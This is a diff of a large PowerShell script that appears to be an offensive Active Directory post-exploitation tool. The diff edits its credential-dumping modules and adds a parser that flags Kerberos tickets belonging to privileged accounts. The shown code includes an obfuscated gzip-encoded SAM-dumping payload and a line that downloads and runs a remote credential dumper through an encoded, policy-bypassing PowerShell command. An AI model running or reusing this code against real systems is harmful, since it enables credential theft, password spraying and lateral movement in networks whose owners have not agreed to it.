@@ -25,51 +25,48 @@ Param(
     [String]$Hash = "",
 
     [Parameter(Mandatory=$False, Position=7, ValueFromPipeline=$true)]
-    [String]$Option = "",
-
-    [Parameter(Mandatory=$False, Position=8, ValueFromPipeline=$true)]
     [String]$Password = "",
 
-    [Parameter(Mandatory=$False, Position=9, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=8, ValueFromPipeline=$true)]
     [String]$AllDomains = "",
 
-    [Parameter(Mandatory=$False, Position=10, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=9, ValueFromPipeline=$true)]
     [String]$UserDomain = "",
 
-    [Parameter(Mandatory=$False, Position=11, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=10, ValueFromPipeline=$true)]
     [String]$LocalFileServer = "",
 
-    [Parameter(Mandatory=$False, Position=12, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=11, ValueFromPipeline=$true)]
     [String]$Threads = "8",
 
-    [Parameter(Mandatory=$False, Position=13, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=12, ValueFromPipeline=$true)]
     [switch]$Force,
 
-    [Parameter(Mandatory=$False, Position=14, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=13, ValueFromPipeline=$true)]
     [switch]$LocalAuth,
     
-    [Parameter(Mandatory=$False, Position=15, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=14, ValueFromPipeline=$true)]
     [switch]$CurrentUser,
 
-    [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=15, ValueFromPipeline=$true)]
     [switch]$SuccessOnly,
 
-    [Parameter(Mandatory=$False, Position=17, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=16, ValueFromPipeline=$true)]
     [switch]$ShowOutput,
 
-    [Parameter(Mandatory=$False, Position=18, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=17, ValueFromPipeline=$true)]
     [String]$Ticket = "",
 
-    [Parameter(Mandatory=$False, Position=19, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=18, ValueFromPipeline=$true)]
     [Switch]$AccountAsPassword,
 
-    [Parameter(Mandatory=$False, Position=20, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=19, ValueFromPipeline=$true)]
     [Switch]$EmptyPassword,
 
-    [Parameter(Mandatory=$False, Position=21, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=20, ValueFromPipeline=$true)]
     [int]$Port = "",
 
-    [Parameter(Mandatory=$False, Position=22, ValueFromPipeline=$true)]
+    [Parameter(Mandatory=$False, Position=21, ValueFromPipeline=$true)]
     [Switch]$NoParse
 )
 
@@ -867,6 +864,7 @@ elseif ($Method -eq "GenRelayList"){
 ################################################################################################################
 
 $ConsoleHostHistory = @'
+Write-Output ""
 $usersFolderPath = "C:\Users"
 $users = Get-ChildItem -Path $usersFolderPath -Directory
 
@@ -985,7 +983,7 @@ foreach ($user in $users) {
 
 
 $LocalSAM = @'
-function DumpSAM{$gz="H4sIAAAAAAAEAL1Ze3ObSBL/f6v2O3AcSSAGiqdApqiLLNmObu3YGznZupNZLxIjiwiBwsOWoui7X89DWLJlJ5u4zumfgJnunp5HPyCjKh2WcZZynWo667VOl8Jhnmd5izSe52iEcpQOEedzfC9OUFomi3aWlnFaIf7XX8p8sXy57N9kcRT04+msWBTqbZyaRrBaDcNyOF62oki5WMwQR347aBSnMRmPr4o4veZ6i6JEU2/zQX1fwQBTpHbTEuXZrI
+Write-Output "" ; function DumpSAM{$gz="H4sIAAAAAAAEAL1Ze3ObSBL/f6v2O3AcSSAGiqdApqiLLNmObu3YGznZupNZLxIjiwiBwsOWoui7X89DWLJlJ5u4zumfgJnunp5HPyCjKh2WcZZynWo667VOl8Jhnmd5izSe52iEcpQOEedzfC9OUFomi3aWlnFaIf7XX8p8sXy57N9kcRT04+msWBTqbZyaRrBaDcNyOF62oki5WMwQR347aBSnMRmPr4o4veZ6i6JEU2/zQX1fwQBTpHbTEuXZrI
 fym3iICi8Np6iYhWANHWo5qwZJPOSGSVgUHBl32e8kSXc6y/JS/IufoDxFiWmoUZL8xcs9VJ6ERUkm6Jd5haSAaSjKsIQLmsOAKTfIsoRrJ1mB3oZplCARDDkvc25MHyXvOQZhOs9mCJY5g+kVYhWnJTejD60h/pWJKYNuOkZ5XNLh5Q2ubnTPmDC6CWfxj814w5SLbILS9bRZGxudGNlBRZyjiBmZVeV6OkRw5zL9jGWdagY9YYmI+sN5vSGH87iA
 s3hN2qlp0e22cYw1mRGeVlnm8aAqUUG5wTyUF1ka4jN5gm5QQtsJMz6xm5Objd+hW9LzjHO7swCdZNfXKDpLPxQor6f43OO9h0nm5UXWQ8lIlLzVil/9+stoHQW6rd6y357C9pUHcRrB0oqgLMzDqdg/xxcEmsRT2OCwzPKFL+Dh5POsIE7ta1LQL4Z5PCsHSTacBAI7O/KGcM2sA3M2+ISGZT8IhFZ+XU0hvpzAjkqeEPrH5z1OeQdCHA+unWTXWc
 p/BauBn1OO4rwoOZ1TDuczMAaGgVUsF1w38uKRKAoDfzsc7e9vOpo2tzRNprb3YaGBQQgliVPQZ65PFx4k/gvBR1oKQ7//SEBST8O8GIcJ8B7TLfgDD0b2QZRWQuRvK8OmKWlWck/YRj1PGMjaXDuU+xCAAyGSfsqM0fea8cDNhAibYWjkT97WQnrwj86sHP2UlTiTPGbXYy7yk0O+5NbHk3uzefpWkKPCJHncnm0X+hkTVqt7ORTy63T+DCn0Alz+
@@ -1027,7 +1025,7 @@ $Command = "powershell.exe -ep bypass -enc $base64command"
 }
 
 # LogonPasswords
-elseif (($Module -eq "LogonPasswords") -or ($Module -eq "LogonPasswords" -and $Option -eq "Parse")){
+elseif ($Module -eq "LogonPasswords"){
 $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""dump"""
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
@@ -1095,7 +1093,7 @@ $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicod
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
 
-elseif ($Module -eq "" -and $Option -eq "" -and $Command -ne ""){
+elseif ($Module -eq "" -and $Command -ne ""){
 $base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
 $Command = "powershell.exe -ep bypass -enc $base64Command"
 }
@@ -3174,12 +3172,12 @@ if ($wait) {
 $tcpClient.Close()
 if (!$connected) {continue}   elseif ($Connected){
 
-        if ($Method -eq "GenRelayList" -and $Option -ne "Parse") {
+        if ($Method -eq "GenRelayList") {
             $Signing = Get-SMBSigning -Target $ComputerName
 
             if ($Signing -match "Signing Enabled") {
                 if ($SuccessOnly) {
-                    return
+                    continue
                 } elseif (!$SuccessOnly) {
                     Display-ComputerStatus -ComputerName $ComputerName -OS $OS -statusColor "Red" -statusSymbol "[-] " -statusText "SMB Signing Required" -NameLength $NameLength -OSLength $OSLength
                 }
@@ -3598,11 +3596,6 @@ Write-Host "Both -AccountAsPassword and -EmptyPassword provided"
 return
 }
 
-if ($Option -ne ""){
-Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-Write-Host "Option is not a valid parameter for spraying"
-return
-}
     
 
             
@@ -4403,6 +4396,111 @@ function AdminCount {
     return $false
 }
 
+################################################################################################################
+############################################## Function: Parse-KerbDump ########################################
+################################################################################################################
+function AdminCount {
+    param (
+        [string]$UserName,
+        [System.DirectoryServices.DirectorySearcher]$Searcher
+    )
+
+    $Searcher.Filter = "(sAMAccountName=$UserName)"
+    $Searcher.PropertiesToLoad.Clear()
+    $Searcher.PropertiesToLoad.Add("adminCount") > $null
+
+    $user = $Searcher.FindOne()
+
+    if ($user -ne $null) {
+        $adminCount = $user.Properties["adminCount"]
+        if ($adminCount -eq 1) {
+            return $true
+        }
+    }
+    return $false
+}
+
+function Parse-KerbDump {
+
+    Write-Host "`nParsing Results" -ForegroundColor "Yellow"
+    Start-Sleep -Seconds "1"
+
+    # Ensure the path exists
+    if (-Not (Test-Path -Path $KerbDump -PathType Container)) {
+        Write-Host "Path does not exist: $KerbDump" -ForegroundColor Red
+        return
+    }
+
+    # Initialize DirectorySearcher
+    $Searcher = New-Object System.DirectoryServices.DirectorySearcher
+    $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domain")
+
+    Get-ChildItem -Path $KerbDump -Filter "*KerbDump.txt" | 
+        Where-Object { $_.Length -gt 0 } | 
+        ForEach-Object {
+            $Computer = $_.BaseName -split '-KerbDump' | Select-Object -First 1
+
+            Write-Host "`n`n-[$Computer]-`n"
+
+            $fileContent = Get-Content -Path $_.FullName -Raw
+
+            # Define regex pattern to match ticket details
+            $pattern = "Service Name\s+:\s+(.+?)`r?`nEncryptionType\s+:\s+(.+?)`r?`nTicket Exp\s+:\s+(.+?)`r?`nServer Name\s+:\s+(.+?)`r?`nUserName\s+:\s+(.+?)`r?`nFlags\s+:\s+(.+?)`r?`nSession Key Type\s+:\s+(.+?)`r?`n"
+
+            # Match and extract details
+            $matches = [regex]::Matches($fileContent, $pattern)
+            foreach ($match in $matches) {
+                $data = @{
+                    ServiceName     = $match.Groups[1].Value
+                    EncryptionType  = $match.Groups[2].Value
+                    TicketExp       = $match.Groups[3].Value
+                    ServerName      = $match.Groups[4].Value
+                    UserName        = $match.Groups[5].Value
+                    Flags           = $match.Groups[6].Value
+                    SessionKeyType  = $match.Groups[7].Value
+                }
+
+                $userNameParts = $data.UserName -split '@'
+                $domainName = ($userNameParts[1] -split '\.')[0]  # Extracting domain name before the dot
+                $actualUserName = $userNameParts[0]
+
+                # Initialize notes
+                $notes = ""
+
+                # Check AdminCount
+                if (AdminCount -UserName $actualUserName -Searcher $Searcher) {
+                    $notes += "[AdminCount=1] "
+                }
+
+                # Check for other tags
+                if ($data.ServiceName -match "krbtgt/") {
+                    $notes += "[TGT] "
+                }
+                if ($actualUserName -in $DomainAdmins) { $notes += "[Domain Admin] " }
+                if ($actualUserName -in $EnterpriseAdmins) { $notes += "[Enterprise Admin] " }
+                if ($actualUserName -in $ServerOperators) { $notes += "[Server Operator] " }
+                if ($actualUserName -in $AccountOperators) { $notes += "[Account Operator] " }
+
+                # Only display blocks of data if a tag will be present
+                if ($notes -ne "") {
+                    Write-Host "User Name     : $($domainName.ToUpper())\$($actualUserName)"
+                    Write-Host "Service Name  : $($data.ServiceName)"
+                    Write-Host "Server Name   : $($data.ServerName)"
+                    Write-Host "Ticket Expiry : $($data.TicketExp)"
+                    Write-Host -NoNewline "Notes         : "
+                    Write-Host -ForegroundColor Yellow -NoNewline "$notes"
+                    Write-Host "`n"
+                }
+            }
+        }
+}
+
+
+
+
+
+
+
 
 ################################################################################################################
 ################################################# Function: RestoreTicket ######################################
@@ -4445,6 +4543,7 @@ switch ($Method) {
 if (!$NoParse){if ($Module -eq "SAM"){Parse-SAM}}
 if (!$NoParse){if ($Module -eq "eKeys"){Parse-eKeys}}
 if (!$NoParse){if ($Module -eq "LogonPasswords"){Parse-LogonPasswords}}
+if (!$NoParse){if ($Module -eq "KerbDump"){Parse-KerbDump}}
 
 RestoreTicket
 
